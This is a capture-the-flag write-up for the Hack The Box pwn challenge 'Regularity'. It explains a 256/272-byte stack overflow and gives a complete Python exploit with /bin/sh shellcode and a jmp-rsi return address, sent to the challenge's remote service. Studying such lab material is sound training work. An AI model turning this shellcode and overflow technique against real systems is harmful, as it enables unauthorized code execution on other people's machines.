# HTB — Regularity

**Category:** Pwn  
**Platform:** Hack The Box  
**Architecture:** Linux x86-64

## 📝 Challenge Description

The program displays a greeting and asks for user input. Its input-handling routine contains a stack-based buffer overflow that can be exploited to redirect program execution and retrieve the remote flag.

## 1. Download and Extract the Challenge

Navigate to the Downloads folder and extract the challenge archive:

```bash
cd ~/Downloads
unzip pwn_regularity.zip
cd pwn_regularity
```

Make the binary executable:

```bash
chmod +x regularity
```

Check the binary type:

```bash
file regularity
```

Output:

```text
ELF 64-bit LSB executable, x86-64,
statically linked, not stripped
```

The provided `flag.txt` contained a fake testing flag:

```text
HTB{f4k3_fLaG_f0r_t3sTiNg}
```

Therefore, I needed to exploit the remote service to retrieve the actual flag.

## 2. Connect to the Remote Service

Connect using Netcat:

```bash
nc 154.57.164.79 43019
```

The service displayed:

```text
Hello, Survivor. Anything new these days?
```

Entering `hello` returned:

```text
Yup, same old same old here as well...
```

This confirmed that the service was responding to user input.

## 3. Analyze the Binary

Inspect the available strings:

```bash
strings -a regularity
```

Inspect the binary sections:

```bash
objdump -h regularity
```

Disassemble the executable:

```bash
objdump -d -M intel regularity
```

The important instructions in the `read` routine were:

```asm
sub rsp, 256
mov eax, 0
mov edi, 0
lea rsi, [rsp]
mov edx, 272
syscall
add rsp, 256
ret
```

### Vulnerability

The program allocates 256 bytes on the stack but allows up to 272 bytes to be read. This can overwrite stack data, including the return address.

The binary also contains a jump instruction at address `0x401041`:

```asm
jmp rsi
```

This instruction became important when constructing the exploit.

## 4. Test the Buffer Overflow

Send an oversized input to the local binary:

```bash
python3 -c 'print("A"*272)' | ./regularity
```

The program displayed its greeting and then crashed:

```text
Hello, Survivor. Anything new these days?
Segmentation fault
```

This confirmed that the oversized input could corrupt program execution.

## 5. Create the Exploit

Create a Python script that connects to the remote service, sends shellcode, redirects execution, and requests the remote flag.

```bash
cat > /tmp/solve.py <<'PY'
import socket
import struct
import time

HOST = "154.57.164.79"
PORT = 43019

shellcode = bytes.fromhex(
    "48b82f62696e2f7368009950545f"
    "525e6a3b580f05"
)

payload = shellcode.ljust(256, b"\x90")
payload += struct.pack("<Q", 0x401041)

with socket.create_connection((HOST, PORT), timeout=5) as s:
    print(s.recv(1024).decode(errors="replace"))
    s.sendall(payload)
    time.sleep(0.3)
    s.sendall(b"cat flag.txt\n")
    time.sleep(0.3)
    s.settimeout(2)

    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            print(data.decode(errors="replace"), end="")
    except socket.timeout:
        pass
PY
```

Run the exploit:

```bash
python3 /tmp/solve.py
```

### How the exploit works

1. **Shellcode:** The payload contains Linux x86-64 machine code intended to execute `/bin/sh`.
2. **Padding:** `ljust(256, b"\x90")` fills the initial 256 bytes with NOP instructions after the shellcode.
3. **Return address:** `struct.pack("<Q", 0x401041)` appends the address of the `jmp rsi` instruction in little-endian format.
4. **Remote connection:** Python's `socket` module connects to the challenge service.
5. **Flag retrieval:** The script sends `cat flag.txt` to the resulting shell and prints the response.

## 6. Flag

The remote service returned the actual challenge flag:

```text
HTB{...}

## ✅ Conclusion

Regularity demonstrated how an incorrectly sized input read can overwrite stack data and redirect program execution. By analyzing the binary, testing the overflow, and sending a crafted payload to the remote service, I retrieved the challenge flag.

